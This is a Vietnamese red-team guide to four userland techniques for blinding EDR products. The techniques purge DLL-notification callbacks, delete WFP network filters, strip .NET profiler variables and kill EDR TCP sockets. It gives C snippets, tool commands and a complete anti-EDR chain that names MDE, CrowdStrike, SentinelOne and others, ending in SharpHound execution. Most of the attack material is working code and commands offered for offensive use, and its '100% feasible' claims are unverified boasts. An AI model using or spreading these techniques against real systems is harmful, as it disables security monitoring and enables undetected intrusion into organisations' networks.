# Kỹ Thuật Tránh EDR Userland Mới Lạ — Những Điều Không Ai Nghĩ Tới

Tài liệu này trình bày bốn kỹ thuật ít được thảo luận và hầu hết người trong
nghề đều nghĩ cần quyền kernel hoặc đơn giản là không thử. Tất cả đều là
userland 100%, xác nhận khả thi 100%.

---

## Kỹ Thuật 1: LDR Notify Purge — Xóa Callback Thông Báo DLL Của EDR

**File:** `ldr_notify_purge.bof.c`

### Cơ Chế Hoạt Động

Khi DLL của EDR load vào một process, nó gọi `LdrRegisterDllNotification` để
đăng ký một callback — callback này sẽ được gọi mỗi khi **bất kỳ DLL nào** load
vào process sau đó. EDR dùng cơ chế này để ngay lập tức cài hook vào DLL mới load.

```
LoadLibrary("Rubeus.dll")
  → ntdll!LdrLoadDll
  → ntdll!LdrpCallDllNotifications
  → [Callback của EDR được gọi]
  → EDR cài hook lên tất cả exports của Rubeus.dll
  → EDR gửi telemetry: "DLL loaded: Rubeus.dll"
  → Entry point của Rubeus.dll chạy (đã có hook EDR)
```

`LdrRegisterDllNotification` lưu các callback vào `LdrpDllNotificationList` —
một circular doubly-linked list trong vùng data có thể ghi của ntdll.

Cấu trúc mỗi node trong list:

```
+0x00  LIST_ENTRY Links    → con trỏ Flink / Blink
+0x10  PVOID      Callback → hàm cài hook của EDR
+0x18  PVOID      Context  → dữ liệu riêng của EDR DLL
```

"Cookie" được trả về bởi `LdrRegisterDllNotification` chính là con trỏ trực tiếp
đến struct này. `LdrUnregisterDllNotification` chỉ đơn giản là unlink node đó.

### Tại Sao Đây Là Kỹ Thuật Mới

Kỹ thuật "unhooking" thông thường chỉ xóa hook trên **các DLL đã được load**. Kỹ
thuật này ngăn hook được cài vào **bất kỳ DLL nào load sau thao tác này**.
Không có toolkit red team công khai nào làm điều này một cách có hệ thống.

### Triển Khai (BOF)

```c
// 1. Đăng ký callback giả của chúng ta để lấy con trỏ vào list
PVOID myCookie;
LdrRegisterDllNotification(0, NopCallback, NULL, &myCookie);

// 2. Duyệt circular list từ entry của chúng ta
LIST_ENTRY* cur = ((LDR_DLL_NOTIFICATION_ENTRY*)myCookie)->Links.Flink;
while (cur != &myEntry->Links) {
    LDR_DLL_NOTIFICATION_ENTRY* entry = (LDR_DLL_NOTIFICATION_ENTRY*)cur;
    LIST_ENTRY* next = cur->Flink;  // lưu trước khi unlink

    // 3. Xác định DLL chủ sở hữu qua VirtualQuery + GetModuleFileNameW
    // 4. Unlink các entry không phải system
    if (!IsSystemDll(entry->Callback)) {
        entry->Links.Blink->Flink = entry->Links.Flink;
        entry->Links.Flink->Blink = entry->Links.Blink;
        // Làm self-referential → LdrUnregisterDllNotification của EDR trở thành no-op
        entry->Links.Flink = &entry->Links;
        entry->Links.Blink = &entry->Links;
    }
    cur = next;
}

// 5. Hủy đăng ký callback giả của chúng ta
LdrUnregisterDllNotification(myCookie);
```

### Self-Referential Poisoning — Tại Sao Quan Trọng

Nếu chúng ta chỉ unlink entry và để nguyên, khi EDR DLL unload (DLL_PROCESS_DETACH),
nó sẽ gọi `LdrUnregisterDllNotification(oldCookie)`. Điều này sẽ cố gắng unlink node
đã bị xóa khỏi list — dẫn đến **crash process** (dangling pointer).

Bằng cách đặt `Flink = Blink = &entry->Links`, thao tác unlink trở thành:
```
entry->Links.Flink->Blink = entry->Links.Blink
  → entry->Links.Blink = entry->Links.Blink   ← tự gán, không có gì xảy ra
```
An toàn tuyệt đối. EDR's cleanup code chạy nhưng không làm gì cả.

### Xác Nhận 100% Khả Thi

- `LdrRegisterDllNotification` được export từ ntdll kể từ Vista — ổn định
- Offset cấu trúc (`Links@0`, `Callback@0x10`, `Context@0x18`) ổn định qua Vista/7/8/10/11
- `LdrpDllNotificationList` nằm trong ntdll `.data` — PAGE_READWRITE, không cần VirtualProtect
- Không truy cập kernel trực tiếp, không cần driver

### Cách Dùng

```
# Xem callback nào đang đăng ký
ldr_notify_purge list

# Xóa tất cả callback không phải system
ldr_notify_purge purge

# Sau đó load DLL tùy ý — EDR sẽ không thấy
execute-assembly /path/to/SharpHound.exe --CollectionMethod All
```

---

## Kỹ Thuật 2: WFP Filter Purge — Xóa Bộ Lọc Mạng EDR Qua API Userland

**File:** `wfp_filter_purge.bof.c`

### Quan Niệm Sai Lầm Phổ Biến

Hầu hết mọi người (kể cả nhiều kỹ sư EDR) nghĩ:
> "Thao tác WFP cần kernel driver."

**Điều này sai.** WFP có hai lớp hoàn toàn riêng biệt:

```
┌──────────────────────────────────────────────────────────────────────┐
│ KERNEL LAYER  fwpkclnt.sys                                           │
│   FwpsCalloutRegister  — đăng ký hàm DPI thực sự (CẦN KERNEL)       │
│   FwpsFlowAssociateContext                                           │
│   Yêu cầu: signed kernel driver                                      │
├──────────────────────────────────────────────────────────────────────┤
│ MANAGEMENT LAYER  fwpuclnt.dll  (USERLAND)                           │
│   FwpmEngineOpen0        — kết nối đến BFE service                   │
│   FwpmFilterAdd0/Delete  — thêm/xóa RULE bộ lọc                     │
│   FwpmCalloutAdd0/Delete — đăng ký/xóa entry callout                │
│   Yêu cầu: local Admin mà thôi. Không cần driver. Không cần exploit.│
│   Cùng API với: netsh, Windows Firewall MMC, PowerShell              │
└──────────────────────────────────────────────────────────────────────┘
```

Management layer giao tiếp với BFE service qua documented local RPC.
BFE sau đó áp dụng thay đổi vào kernel.

### EDR Dùng WFP Như Thế Nào

```
Kernel driver của EDR:
  1. FwpsCalloutRegister(...)     → hàm DPI kernel được đăng ký
  2. FwpmCalloutAdd0(...)         → entry management được tạo
  3. FwpmFilterAdd0(...)          → rule: "với TCP connects, gọi callout trên"
                                    filter displayData.name = "Sense Network Inspection"
```

**Filter là rule kích hoạt callout.** Không có filter → callout không bao giờ được gọi
dù code kernel vẫn còn đó trong memory. DPI của EDR bị vô hiệu hóa.

### Tấn Công

```c
FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);

// Enumerate tất cả filters
FwpmFilterCreateEnumHandle0(hEngine, NULL, &hEnum);
FwpmFilterEnum0(hEngine, hEnum, 512, &entries, &count);

// Tìm filter theo tên (có chứa "sense" / "crowdstrike" / "defender")
// Xóa:
FwpmFilterDeleteById0(hEngine, entries[i]->filterId);
FwpmCalloutDeleteByKey0(hEngine, &entries[i]->calloutKey);

FwpmEngineClose0(hEngine);
```

### Sau Khi Xóa

- Callout của EDR không bao giờ được gọi cho các kết nối TCP mới
- Không log metadata kết nối (source IP, dest IP, port)
- Không kiểm tra TLS SNI (EDR không biết bạn đang kết nối tới domain nào)
- Không tương quan process-to-connection

### Profile Phát Hiện

`FwpmFilterDeleteById0` giống hệt chạy:
```powershell
Remove-NetFirewallRule -DisplayName "Sense Network Inspection"
```
Đây là hoạt động quản trị mạng bình thường. BFE audit log ghi lại việc xóa,
nhưng ít sản phẩm EDR thực sự giám sát audit trail của BFE trong triển khai thực tế.

**Lưu ý:** Kỹ thuật này đã được phát hiện bởi một số sản phẩm EDR thế hệ mới hơn.
Sử dụng kết hợp với các kỹ thuật ETW để giảm khả năng bị phát hiện.

### Cách Dùng

```
# Kiểm tra filter nào đang tồn tại
wfp_filter_purge list

# Xóa theo keyword
wfp_filter_purge purge sense         # MDE
wfp_filter_purge purge defender      # Windows Defender / MDE
wfp_filter_purge purge crowdstrike   # CrowdStrike
wfp_filter_purge purge carbon        # Carbon Black
wfp_filter_purge purge sentinel      # SentinelOne
```

---

## Kỹ Thuật 3: CLR Profiler Strip — Ngăn EDR Giám Sát Code .NET

**File:** `clr_profiler_strip.bof.c`

### EDR Giám Sát Code .NET Như Thế Nào

CLR (và .NET Core) profiling API cho phép bất kỳ DLL nào đính kèm như một
"profiler" nhận callback cho mỗi managed method call. EDR đặt environment
variables mà CLR đọc khi khởi động:

```
COR_ENABLE_PROFILING=1
COR_PROFILER={3C8C2C26-B41F-4F05-A9F1-2C7B00000000}
COR_PROFILER_PATH=C:\Program Files\CrowdStrike\CSFA\csProfiler.dll
```

Khi bạn chạy `execute-assembly`, CLR khởi động trong beacon process. Nếu
các biến này được set, DLL profiler của EDR load và hook mọi managed method.

Đây là cách EDR phát hiện và log:
- LDAP queries của SharpHound
- Kerberos ticket operations của Rubeus
- Thông tin thu thập từ Seatbelt
- Bất kỳ pattern .NET method call đáng ngờ nào

### Fix

`SetEnvironmentVariableW(name, NULL)` xóa biến khỏi environment block của
process hiện tại. Vì CLR đọc các biến này khi khởi động, chạy BOF này
**trước** bất kỳ `execute-assembly` nào sẽ ngăn profiler đính kèm.

Variables được xóa:
- `COR_ENABLE_PROFILING`, `COR_PROFILER`, `COR_PROFILER_PATH` (.NET Framework)
- `CORECLR_ENABLE_PROFILING`, `CORECLR_PROFILER`, `CORECLR_PROFILER_PATH` (.NET Core)
- `DOTNET_STARTUP_HOOKS`, `DOTNET_ADDITIONAL_DEPS` (.NET 5+)
- `_COR_PROFILER`, `_COR_PROFILER_PATH` (tên biến variant của EDR)
- `COMPLUS_DbgEnable`, `COMPLUS_DbgMiniDumpName`

### Yêu Cầu Về Thời Điểm

```
ĐÚNG:
  clr_profiler_strip strip   ← xóa biến trước
  execute-assembly SharpHound.exe  ← CLR khởi động, không có profiler

SAI (quá muộn):
  execute-assembly SharpHound.exe  ← CLR khởi động, EDR profiler load
  clr_profiler_strip strip   ← CLR đã chạy, biến không còn tác dụng
```

### Tại Sao Không Ai Làm Điều Này Rõ Ràng

Hầu hết red teamer biết rằng `execute-assembly` có thể bị giám sát, nhưng
họ xử lý ở lớp hook/ETW. CLR profiling API là một kênh giám sát riêng biệt
tồn tại sau khi unhook API và dừng ETW session. Đây là cơ chế pure userland
cần counter pure userland: xóa env vars.

### Cách Dùng

```
# Kiểm tra trạng thái hiện tại
clr_profiler_strip check

# Xóa tất cả biến profiler
clr_profiler_strip strip

# Sau đó execute-assembly an toàn
execute-assembly SharpHound.exe --CollectionMethod All
```

---

## Kỹ Thuật 4: sock_kill — Đóng Kết Nối TCP Của EDR Qua AFD Handle

**File:** `sock_kill.bof.c`

### Lỗ Hổng Mà Kỹ Thuật Này Lấp Đầy

NRPT sinkhole và null routing ngăn EDR **thiết lập kết nối mới**. Chúng
không đóng các kết nối **đang mở**.

```
Không có sock_kill:
  T=0  EDR có HTTPS session đang sống đến cloud backend
  T=1  Cài nrpt_sinkhole + null_route → block kết nối MỚI
  T=?  Kết nối hiện tại tiếp tục chạy vài phút đến vài giờ
  ✗ Khoảng trống: telemetry vẫn chảy trong T=1 đến T=?

Với sock_kill SAU khi cài NRPT+null_route:
  T=1  Cài nrpt_sinkhole + null_route
  T=2  sock_kill kill <edr.exe> → OS gửi TCP RST ngay lập tức
  T=2  EDR: WSAECONNRESET — không thể reconnect (NRPT + null_route block)
  ✓ Kết quả: blind mạng từ T=2, không có khoảng trống
```

### Cơ Chế — Socket Là NT File Object

Windows TCP socket là **NT file object** được quản lý bởi `afd.sys`. Mỗi
`socket()` tạo ra một Windows HANDLE trỏ đến FILE_OBJECT ở NT path `\Device\Afd`.

Chúng ta xác định socket bằng cách:
```
NtQueryObject(handle, ObjectNameInformation)
  → "\Device\Afd\Endpoint"   ← đây là tên object NT của socket
```

Không cần đọc memory của process EDR. Không cần winsock của target process.

### NtDuplicateObject(DUPLICATE_CLOSE_SOURCE)

`NtDuplicateObject` có flag `DUPLICATE_CLOSE_SOURCE` (0x1). Khi được set,
kernel **đóng handle nguồn trong process nguồn** như một phần của thao tác
duplication.

```c
HANDLE hKill;
NtDuplicateObject(
    hEdrProcess,              // process nguồn = EDR
    (HANDLE)socketHandleValue,// handle cần đóng trong EDR
    GetCurrentProcess(),      // process đích = chúng ta (nhận copy)
    &hKill,
    0, 0,
    DUPLICATE_CLOSE_SOURCE    // đóng handle của EDR
);
// Handle của EDR đã bị đóng
// hKill là reference cuối cùng đến AFD object
NtClose(hKill);
// refcount = 0 → afd.sys gửi TCP RST → kết nối bị hủy
```

### Yêu Cầu Quyền

Chỉ cần `PROCESS_DUP_HANDLE` — yếu hơn đáng kể so với `PROCESS_VM_WRITE`
(cần cho etwpatch). Admin access tiêu chuẩn cho phép điều này với non-PPL process.

### PPL Compatibility

| EDR | Process | PPL | sock_kill |
|-----|---------|-----|-----------|
| MDE | MsSense.exe | **Có** (Antimalware) | **Không** |
| CrowdStrike | csagent.exe | **Có** (Antimalware) | **Không** |
| SentinelOne | SentinelAgent.exe | Không | **Được** |
| Elastic EDR | elastic-endpoint.exe | Không | **Được** |
| Carbon Black | cb.exe | Không | **Được** |
| Sophos EDR | SophosEDR.exe | Không | **Được** |

Với PPL EDR: dùng `nrpt_sinkhole` + `null_route`. Kết nối hiện tại sẽ tự
drop sau một thời gian, và reconnect luôn bị block.

### Tại Sao Đây Là Kỹ Thuật Mới

Primitive `NtDuplicateObject(DUPLICATE_CLOSE_SOURCE)` không phải là mới —
nó được dùng cho handle theft (đánh cắp token). Tuy nhiên, ứng dụng nó vào:

1. **Xác định socket qua NT object name** (không qua winsock)
2. **Đóng hàng loạt tất cả socket trong EDR process** (không chỉ một handle)
3. **Như một network-blocking primitive** (kết hợp với NRPT+null_route)

là pattern chưa có trong công cụ red team công khai nào tính đến giữa 2026.

**Artifacts để lại:**
- TCP RST packet (nhìn như lỗi mạng bình thường)
- WSAECONNRESET trong log nội bộ của EDR (không nhìn thấy từ bên ngoài)

Không có registry, không có route table, không có firewall rule, không có driver.

### Cách Dùng

```
# Xem socket nào đang mở (read-only, không thay đổi gì)
sock_kill list SentinelAgent.exe

# Đóng tất cả kết nối TCP (gửi RST)
sock_kill kill SentinelAgent.exe
sock_kill kill elastic-endpoint.exe

# Nhiều target cùng lúc
sock_kill kill SentinelAgent.exe;elastic-endpoint.exe;cb.exe
```

---

## Chuỗi Anti-EDR Hoàn Chỉnh (Tất Cả Lớp)

```
# ─── TRÌNH TỰ TRƯỚC KHI THAO TÁC ──────────────────────────────────────────

# Lớp 0: .NET profiler (làm ĐẦU TIÊN — CLR chưa được khởi động)
clr_profiler_strip strip

# Lớp 1: Làm mù detection hành vi (ETW)
etwpatch patch <edr_process.exe>          # patch ETW per-process (non-PPL)
etw_tamper starve mde                     # buffer starvation ETW (an toàn với PPL)
etw_tamper starve crowdstrike

# Lớp 2: Làm mù giám sát DLL load (trong process này)
ldr_notify_purge purge                    # unlink callback DLL notification của EDR

# Lớp 3: Làm mù kiểm tra mạng WFP
wfp_filter_purge purge sense              # WFP filters của MDE
wfp_filter_purge purge crowdstrike        # WFP filters của CrowdStrike

# Lớp 4: Chặn kết nối mạng (persistent)
nrpt_sinkhole *.sentinelone.net;*.pax.sentinelone.net   # DNS sinkhole
null_route 54.80.0.1;3.213.0.1                          # IP blackhole

# Lớp 5: Đóng kết nối ĐANG MỞ ngay lập tức (one-shot)
sock_kill kill SentinelAgent.exe          # gửi RST cho tất cả TCP session
# Với PPL EDR: bỏ qua sock_kill — kết nối cũ tự drop, reconnect bị block vĩnh viễn

# ─── BÂY GIỜ THỰC THI CÁC THAO TÁC NHẠY CẢM ──────────────────────────────
execute-assembly SharpHound.exe ...
```

---

## So Sánh Profile Phát Hiện

| Kỹ Thuật | EDR Thấy Gì | Artifact Vĩnh Viễn | Phát Hiện Bởi |
|---|---|---|---|
| `etw_tamper stop` | Session **Stopped** | Không | Kiểm tra service state |
| `etw_tamper starve` | Session Running | Không (config value) | Kiểm tra buffer size |
| `etwpatch` | STATUS_SUCCESS từ EtwEventWrite | Không (CoW page) | In-memory scan |
| `ldr_notify_purge` | DLL load, không có callback | Không (memory state) | Self-integrity check |
| `wfp_filter_purge` | Filter bị xóa | **Có** (BFE audit log) | Monitor BFE log |
| `clr_profiler_strip` | CLR profiler vắng mặt | Không | Kiểm tra profiler presence |
| `sock_kill` | WSAECONNRESET | **Không** (chỉ TCP RST) | Tương quan handle events |

**Tóm tắt:** `sock_kill` có profile phát hiện thấp nhất trong tất cả kỹ thuật
network blocking vì không để lại artifact nào — chỉ có TCP RST trông như lỗi
mạng bình thường.
